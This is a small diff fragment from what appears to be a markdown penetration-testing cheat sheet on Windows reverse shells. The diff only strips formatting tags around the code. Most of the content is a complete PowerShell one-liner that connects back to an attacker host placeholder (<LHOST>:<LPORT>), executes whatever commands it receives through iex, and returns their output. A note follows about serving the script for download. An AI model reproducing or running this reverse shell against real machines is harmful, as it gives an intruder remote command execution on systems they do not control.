@@ -8,11 +8,9 @@ https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
 
 ### powershell.exe
 
-{% code title="shell.ps1" %}
 ```text
 $client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-{% endcode %}
 
 ```text
 # serve shell.ps1
